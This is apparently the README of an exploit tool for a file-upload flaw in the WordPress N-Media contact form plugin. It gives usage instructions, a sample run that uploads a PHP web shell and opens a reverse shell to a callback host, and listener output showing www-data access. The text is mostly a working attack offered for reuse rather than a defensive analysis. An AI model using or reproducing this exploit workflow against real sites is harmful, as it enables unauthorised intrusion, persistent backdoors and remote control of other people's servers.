# Exploit for Wordpress N-Media Website Contact Form with File Upload 1.3.4 Shell Upload
This plugin comes with added backdoor upload features, so naturally, I had to quickly knock together an exploit for it. Basically another trivial shell upload, trying to burn through a few of these so I have non-MSF exploits for when needed.

## Usage

To use, simply select which payload you want to use (currently only back_python.php is available, but I plan on adding back_php.php and back_perl.php at a later date). This is the 
"payload.php". You also must specify a callback host and port, along with the URL to the vulnerable Wordpress installation.

Example Use:
```
xrl:~$ python2 nmediapwn.py http://192.168.0.15/wordpress/ back_python.php 192.168.0.9 1337

███╗   ██╗███╗   ███╗███████╗██████╗ ██╗ █████╗ ██████╗ ██╗    ██╗███╗   ██╗
████╗  ██║████╗ ████║██╔════╝██╔══██╗██║██╔══██╗██╔══██╗██║    ██║████╗  ██║
██╔██╗ ██║██╔████╔██║█████╗  ██║  ██║██║███████║██████╔╝██║ █╗ ██║██╔██╗ ██║
██║╚██╗██║██║╚██╔╝██║██╔══╝  ██║  ██║██║██╔══██║██╔═══╝ ██║███╗██║██║╚██╗██║
██║ ╚████║██║ ╚═╝ ██║███████╗██████╔╝██║██║  ██║██║     ╚███╔███╔╝██║ ╚████║
╚═╝  ╚═══╝╚═╝     ╚═╝╚══════╝╚═════╝ ╚═╝╚═╝  ╚═╝╚═╝      ╚══╝╚══╝ ╚═╝  ╚═══╝
Exploit for NMedia Contact Form w/ Backdoor Upload ;) Version: 20150427.1
{+} Using target URL of: http://192.168.0.15/wordpress//wp-admin/admin-ajax.php
{+} Our shell is at: http://192.168.0.15/wordpress//wp-content/uploads/contact_files/1430163090-pwn.php
{*} Sending Backconnect to 192.168.0.9:1337...
{*} Sending our payload...
{+} Using 192.168.0.9:1337 as callback...
{+} Dropping shell...
{+} Shell dropped... Triggering...
{+} got shell?
xrl:~$
```

Listener (I suggest using the [tcp-pty-shell-handler][shellhandle]):
```
$ python2 ./python-pty-shells/tcp_pty_shell_handler.py -b 0.0.0.0:1337
Got root yet?
Linux htp 3.18.0-kali3-amd64 #1 SMP Debian 3.18.6-1~kali2 (2015-03-02) x86_64 GNU/Linux
uid=33(www-data) gid=33(www-data) groups=33(www-data)
www-data@htp:/var/www/wordpress/wp-content/uploads/contact_files$ exit
exit
quitting, cleanup
```

## Demo 
If you want, check out the [Asciicast demo][asciicast]. The ASCII art got a bit fucked this time around due to term resizing.
[![asciicast](https://asciinema.org/a/19275.png)](https://asciinema.org/a/19275)

## Licence
Licenced under the [WTFPL][wtfpl]

[asciicast]: https://asciinema.org/a/19275
[wtfpl]: http://www.wtfpl.net/
[shellhandle]: https://github.com/infodox/python-pty-shells
